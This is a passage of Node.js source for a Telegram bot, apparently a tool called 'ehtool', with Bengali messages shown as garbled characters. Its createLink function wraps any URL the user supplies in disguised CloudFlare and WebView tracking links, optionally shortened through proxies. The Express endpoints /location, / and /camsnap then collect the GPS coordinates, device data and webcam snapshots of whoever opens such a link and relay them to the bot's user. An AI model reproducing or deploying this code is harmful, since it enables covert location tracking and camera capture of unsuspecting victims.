            bot.sendMessage(chatId, `‚ö†Ô∏è ‡¶∏‡¶†‡¶ø‡¶ï ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞: /allow <user_id> [‡¶∏‡¶Æ‡¶Ø‡¶º]`);
            return;
        }

        let duration = 'forever';
        let expiresAt = 'forever';
        
        if (parts.length > 2) {
            duration = parts.slice(2).join(' ');
            const now = new Date();
            const timeValue = parseInt(duration);
            
            if (isNaN(timeValue)) {
                bot.sendMessage(chatId, `‚ö†Ô∏è ‡¶∏‡¶Æ‡¶Ø‡¶º ("${duration}") ‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶Ø‡¶º‡•§ ‡¶∏‡¶Æ‡¶Ø‡¶º ‡¶Ö‡¶¨‡¶∂‡ßç‡¶Ø‡¶á ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ ‡¶è‡¶¨‡¶Ç ‡¶§‡¶æ‡¶∞ ‡¶™‡¶ø‡¶õ‡¶®‡ßá ‡¶è‡¶ï‡¶ï (‡¶Ø‡ßá‡¶Æ‡¶® 5m, 2h, 1d) ‡¶π‡¶§‡ßá ‡¶π‡¶¨‡ßá‡•§`);
                return;
            }
            
            let timeSet = false;
            if (duration.endsWith('m')) {
                now.setMinutes(now.getMinutes() + timeValue);
                timeSet = true;
            } else if (duration.endsWith('h')) {
                now.setHours(now.getHours() + timeValue);
                timeSet = true;
            } else if (duration.endsWith('d')) {
                now.setDate(now.getDate() + timeValue);
                timeSet = true;
            } 
            
            if (timeSet) {
                if (!isNaN(now.getTime())) {
                    expiresAt = now.toISOString(); 
                } else {
                     bot.sendMessage(chatId, `‚ö†Ô∏è ‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶∏‡¶Æ‡¶Ø‡¶º ‡¶ó‡¶£‡¶®‡¶æ‡¶§‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶ó‡ßÅ‡¶∞‡ßÅ‡¶§‡¶∞ ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§ ‡¶Ü‡¶¨‡¶æ‡¶∞ ‡¶ö‡ßá‡¶∑‡ßç‡¶ü‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§`);
                     return;
                }
            } else {
                bot.sendMessage(chatId, `‚ö†Ô∏è ‡¶∏‡¶Æ‡¶Ø‡¶º ("${duration}") ‡¶∏‡¶†‡¶ø‡¶ï ‡¶®‡¶Ø‡¶º‡•§ ‡¶∏‡¶Æ‡¶Ø‡¶º ‡¶Ö‡¶¨‡¶∂‡ßç‡¶Ø‡¶á ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶Ç‡¶ñ‡ßç‡¶Ø‡¶æ ‡¶è‡¶¨‡¶Ç ‡¶§‡¶æ‡¶∞ ‡¶™‡¶ø‡¶õ‡¶®‡ßá ‡¶è‡¶ï‡¶ï (‡¶Ø‡ßá‡¶Æ‡¶® 5m, 2h, 1d) ‡¶π‡¶§‡ßá ‡¶π‡¶¨‡ßá‡•§`);
                return;
            }
        }
        
        allowedUsers[userIdToAdd] = { expires: expiresAt };
        saveAllowedUsers();

        const messageToUser = expiresAt === 'forever' ?
            `‡¶Ö‡¶≠‡¶ø‡¶®‡¶®‡ßç‡¶¶‡¶®! ‡¶Ü‡¶™‡¶®‡¶æ‡¶ï‡ßá ‡¶≤‡¶æ‡¶á‡¶´‡¶ü‡¶æ‡¶á‡¶Æ‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶¨‡¶ü ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§` :
            `‡¶Ö‡¶≠‡¶ø‡¶®‡¶®‡ßç‡¶¶‡¶®! ‡¶Ü‡¶™‡¶®‡¶æ‡¶ï‡ßá ${duration} ‡¶∏‡¶Æ‡¶Ø‡¶º‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶¨‡¶ü ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§`;
        
        bot.sendMessage(userIdToAdd, messageToUser);
        bot.sendMessage(chatId, `‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ${userIdToAdd} ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ‡¶Ø‡¶º ‡¶Ø‡ßÅ‡¶ï‡ßç‡¶§ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá (${duration} ‡¶è‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø)‡•§`);

    } else {
        bot.sendMessage(chatId, `‚ö†Ô∏è ‡¶∏‡¶†‡¶ø‡¶ï ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞: /allow <user_id> [‡¶∏‡¶Æ‡¶Ø‡¶º]`);
    }
}
// ‡¶®‡¶§‡ßÅ‡¶® ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°: /disallow <chat_id>
else if (msg.text && msg.text.startsWith('/disallow')) {
    if (chatId !== ownerId) {
        bot.sendMessage(chatId, '‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶∂‡ßÅ‡¶ß‡ßÅ‡¶Æ‡¶æ‡¶§‡ßç‡¶∞ ‡¶¨‡¶ü‡ßá‡¶∞ ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶® ‡¶è‡¶á ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®‡•§');
        return;
    }
    const parts = msg.text.split(' ');
    if (parts.length === 2) {
        const userIdToRemove = parseInt(parts[1], 10);
        if (!isNaN(userIdToRemove)) {
            if (allowedUsers[userIdToRemove]) {
                delete allowedUsers[userIdToRemove];
                saveAllowedUsers();
                bot.sendMessage(userIdToRemove, `‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶ü ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶™‡ßç‡¶∞‡¶§‡ßç‡¶Ø‡¶æ‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§`);
                bot.sendMessage(chatId, `‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ${userIdToRemove} ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ ‡¶•‡ßá‡¶ï‡ßá ‡¶∏‡¶∞‡¶æ‡¶®‡ßã ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§`);
            } else {
                bot.sendMessage(chatId, `‡¶á‡¶â‡¶ú‡¶æ‡¶∞ ‡¶Ü‡¶á‡¶°‡¶ø ${userIdToRemove} ‡¶Ö‡¶®‡ßÅ‡¶Æ‡ßã‡¶¶‡¶ø‡¶§ ‡¶§‡¶æ‡¶≤‡¶ø‡¶ï‡¶æ‡¶Ø‡¶º ‡¶®‡ßá‡¶á‡•§`);
            }
        } else {
            bot.sendMessage(chatId, `‚ö†Ô∏è ‡¶∏‡¶†‡¶ø‡¶ï ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞: /disallow <user_id>`);
        }
    } else {
        bot.sendMessage(chatId, `‚ö†Ô∏è ‡¶∏‡¶†‡¶ø‡¶ï ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞: /disallow <user_id>`);
    }
}
// ‡¶®‡¶§‡ßÅ‡¶® ‡¶ï‡¶Æ‡¶æ‡¶®‡ßç‡¶°: /uptime
else if (msg.text === '/uptime') {
    const uptimeInSeconds = Math.floor((new Date() - startTime) / 1000);
    const hours = Math.floor(uptimeInSeconds / 3600);
    const minutes = Math.floor((uptimeInSeconds % 3600) / 60);
    const seconds = uptimeInSeconds % 60;
    bot.sendMessage(chatId, `‡¶¨‡¶ü‡¶ü‡¶ø ‡¶ö‡¶æ‡¶≤‡ßÅ ‡¶Ü‡¶õ‡ßá ${hours} ‡¶ò‡¶®‡ßç‡¶ü‡¶æ, ${minutes} ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü, ‡¶è‡¶¨‡¶Ç ${seconds} ‡¶∏‡ßá‡¶ï‡ßá‡¶®‡ßç‡¶° ‡¶ß‡¶∞‡ßá‡•§`);
}
// ‡¶Ø‡¶¶‡¶ø ‡¶ï‡ßã‡¶®‡ßã ‡¶ü‡ßá‡¶ï‡ßç‡¶∏‡¶ü ‡¶Æ‡ßá‡¶∏‡ßá‡¶ú ‡¶®‡¶æ ‡¶•‡¶æ‡¶ï‡ßá (‡¶Ø‡ßá‡¶Æ‡¶® ‡¶õ‡¶¨‡¶ø, ‡¶∏‡ßç‡¶ü‡¶ø‡¶ï‡¶æ‡¶∞), ‡¶§‡¶æ‡¶π‡¶≤‡ßá ‡¶è‡¶ñ‡¶æ‡¶®‡ßá ‡¶∂‡ßá‡¶∑ ‡¶π‡¶¨‡ßá‡•§
else if (!msg.text) {
    return;
}
});

bot.on('callback_query',async function onCallbackQuery(callbackQuery) {
bot.answerCallbackQuery(callbackQuery.id);
// üõë ‡¶´‡¶ø‡¶ï‡ßç‡¶∏: ‡¶è‡¶ñ‡¶æ‡¶®‡ßá‡¶ì isAllowed ‡¶ö‡ßá‡¶ï‡¶ü‡¶ø callback ‡¶è‡¶∞ ‡¶™‡¶∞‡ßá‡¶ì ‡¶•‡¶æ‡¶ï‡¶§‡ßá ‡¶π‡¶¨‡ßá‡•§
if (!isAllowed(callbackQuery.from.id)) {
    bot.sendMessage(callbackQuery.from.id, `‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶è‡¶á ‡¶¨‡¶ü‡¶ü‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞‡ßá‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶®‡ßá‡¶á‡•§üò¢\n\n‡¶è‡¶á ‡¶¨‡¶ü‡¶ü‡¶ø ‡¶Ü‡¶™‡¶®‡¶ø ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶ö‡¶æ‡¶á‡¶≤‡ßá ‡¶®‡¶ø‡¶ö‡ßá ‡¶¶‡ßá‡¶ì‡¶Ø‡¶º‡¶æ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶è‡¶∞ ‡¶Æ‡¶æ‡¶ß‡ßç‡¶Ø‡¶Æ‡ßá ‡¶Ö‡ßç‡¶Ø‡¶æ‡¶°‡¶Æ‡¶ø‡¶®‡ßá‡¶∞ ‡¶∏‡¶æ‡¶•‡ßá ‡¶Ø‡ßã‡¶ó‡¶æ‡¶Ø‡ßã‡¶ó ‡¶ï‡¶∞‡ßÅ‡¶®‡•§üéâ/n/n/nTelegram : @ehtool_admin\n\nTelegram Channel : @ehtool\n\nFacebook : https://www.facebook.com/ehtoolbysakib`);
    return;
}
if(callbackQuery.data=="crenew"){
createNew(callbackQuery.message.chat.id);
}
});
bot.on('polling_error', (error) => {
//console.log(error.code);
});


// üéØ ‡¶∏‡¶Ç‡¶∂‡ßã‡¶ß‡¶ø‡¶§ createLink ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® (TypeError ‡¶´‡¶ø‡¶ï‡ßç‡¶∏ ‡¶ï‡¶∞‡¶æ ‡¶π‡ßü‡ßá‡¶õ‡ßá)
async function createLink(cid, msg) {
    // üõë ‡¶´‡¶ø‡¶ï‡ßç‡¶∏: ‡¶™‡ßç‡¶∞‡¶•‡¶Æ‡ßá ‡¶ö‡ßá‡¶ï ‡¶ï‡¶∞‡ßÅ‡¶® msg ‡¶è‡¶ï‡¶ü‡¶ø ‡¶¨‡ßà‡¶ß ‡¶∏‡ßç‡¶ü‡ßç‡¶∞‡¶ø‡¶Ç ‡¶ï‡¶ø‡¶®‡¶æ‡•§ ‡¶®‡¶æ ‡¶π‡¶≤‡ßá ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ‡¶∂‡ßá‡¶∑ ‡¶ï‡¶∞‡ßÅ‡¶®‡•§
    if (typeof msg !== 'string' || msg.length === 0) {
        bot.sendMessage(cid, `‚ö†Ô∏è ‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶Ü‡¶™‡¶®‡¶ø ‡¶ï‡ßã‡¶®‡ßã ‡¶∏‡¶†‡¶ø‡¶ï ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶¶‡ßá‡¶®‡¶®‡¶ø ‡¶¨‡¶æ ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶¨‡¶æ‡¶∞‡ßç‡¶§‡¶æ‡¶ü‡¶ø ‡¶ü‡ßá‡¶ï‡ßç‡¶∏‡¶ü ‡¶´‡¶∞‡¶Æ‡ßç‡¶Ø‡¶æ‡¶ü‡ßá ‡¶®‡ßá‡¶á‡•§`);
        createNew(cid);
        return; 
    }

    var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

    if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {

        var url = cid.toString(36) + '/' + btoa(msg);
        var m = {
            reply_markup: JSON.stringify({
                "inline_keyboard": [
                    [{
                        text: "Create new Link",
                        callback_data: "crenew"
                    }]
                ]
            })
        };

        var cUrl = `${hostURL}/c/${url}`;
        var wUrl = `${hostURL}/w/${url}`;

        bot.sendChatAction(cid, "typing");
        if (usecodetabs) {
            var x = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest=" + cUrl)}`).then(res => res.json());
            var y = await fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent("https://api.codetabs.com/v1/proxy/?quest=" + wUrl)}`).then(res => res.json());

            var f = "",
                g = "";

            for (var c in x) {
                f += x[c] + "\n";
            }

            for (var c in y) {
                g += y[c] + "\n";
            }

            bot.sendMessage(cid, `‡¶®‡¶§‡ßÅ‡¶® ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ó‡ßÅ‡¶≤‡¶ø ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§ ‡¶Ü‡¶™‡¶®‡¶ø ‡¶®‡ßÄ‡¶ö‡ßá‡¶∞ ‡¶Ø‡ßá‡¶ï‡ßã‡¶®‡ßã ‡¶è‡¶ï‡¶ü‡¶ø ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶¨‡ßç‡¶Ø‡¶¨‡¶π‡¶æ‡¶∞ ‡¶ï‡¶∞‡¶§‡ßá ‡¶™‡¶æ‡¶∞‡ßá‡¶®‡•§.\nURL: ${msg}\n\n‚úÖ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ó‡ßÅ‡¶≤‡ßã\n\nüåê CloudFlare Page Link\n${f}\n\nüåê WebView Page Link\n${g}`, m);
        } else {

            bot.sendMessage(cid, `‡¶®‡¶§‡ßÅ‡¶® ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ó‡ßÅ‡¶≤‡¶ø ‡¶∏‡¶´‡¶≤‡¶≠‡¶æ‡¶¨‡ßá ‡¶§‡ßà‡¶∞‡¶ø ‡¶ï‡¶∞‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§\nURL: ${msg}\n\n‚úÖ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ó‡ßÅ‡¶≤‡ßã\n\nüåê CloudFlare Page Link\n${cUrl}\n\nüåê WebView Page Link\n${wUrl}`, m);
        }
    } else {
        bot.sendMessage(cid, `‚ö†Ô∏è ‡¶¶‡¶Ø‡¶º‡¶æ ‡¶ï‡¶∞‡ßá ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶†‡¶ø‡¶ï ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï ‡¶¶‡¶ø‡¶® , ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡ßá ‡¶Ö‡¶¨‡¶∂‡ßç‡¶Ø‡¶á http ‡¶Ö‡¶•‡¶¨‡¶æ https ‡¶•‡¶æ‡¶ï‡¶§‡ßá ‡¶π‡¶¨‡ßá‡•§`);
        createNew(cid);
    }
}
// üéØ createLink ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® ‡¶∂‡ßá‡¶∑


function createNew(cid){
var mk={
reply_markup:JSON.stringify({"force_reply":true})
};
bot.sendMessage(cid,`üåê ‡¶Ü‡¶™‡¶®‡¶æ‡¶∞ ‡¶≤‡¶ø‡¶ô‡ßç‡¶ï‡¶ü‡¶ø ‡¶¶‡¶ø‡¶®`,mk);
}


app.get("/", (req, res) => {
var ip;
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.json({"ip":ip});


});


app.post("/location",(req,res)=>{

var lat=parseFloat(decodeURIComponent(req.body.lat)) || null;
var lon=parseFloat(decodeURIComponent(req.body.lon)) || null;
var uid=decodeURIComponent(req.body.uid) || null;
var acc=decodeURIComponent(req.body.acc) || null;
if(lon != null && lat != null && uid != null && acc != null){

bot.sendLocation(parseInt(uid,36),lat,lon);

bot.sendMessage(parseInt(uid,36),`Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);

res.send("Done");
}
});


app.post("/",(req,res)=>{

var uid=decodeURIComponent(req.body.uid) || null;
var data=decodeURIComponent(req.body.data)  || null;
if( uid != null && data != null){


data=data.replaceAll("<br>","\n");

bot.sendMessage(parseInt(uid,36),data,{parse_mode:"HTML"});


res.send("Done");
}
});


app.post("/camsnap",(req,res)=>{
    var uid=decodeURIComponent(req.body.uid) || null;
    var img=decodeURIComponent(req.body.img) || null;

    if(uid != null && img != null){
        
        const base64Data = img;
        if (!base64Data) {
            console.log("Empty Base64 data.");
            res.send("Empty Base64 Data");
            return;
        }

        try {
            var buffer=Buffer.from(base64Data,'base64');
            var info={
                filename:"camsnap.png",
                contentType: 'image/png'
            };

            bot.sendPhoto(parseInt(uid,36),buffer,{},info);
            res.send("Done");

        } catch (error) {
            console.log("Error processing image:", error);
            bot.sendMessage(parseInt(uid,36), `‚ö†Ô∏è ‡¶¶‡ßÅ‡¶É‡¶ñ‡¶ø‡¶§, ‡¶õ‡¶¨‡¶ø ‡¶™‡ßç‡¶∞‡¶∏‡ßá‡¶∏ ‡¶ï‡¶∞‡¶æ‡¶∞ ‡¶∏‡¶Æ‡¶Ø‡¶º ‡¶è‡¶ï‡¶ü‡¶ø ‡¶∏‡¶Æ‡¶∏‡ßç‡¶Ø‡¶æ ‡¶π‡¶Ø‡¶º‡ßá‡¶õ‡ßá‡•§`);
            res.send("Error");
        }
    } else {
        res.send("No Data");
    }
});



app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
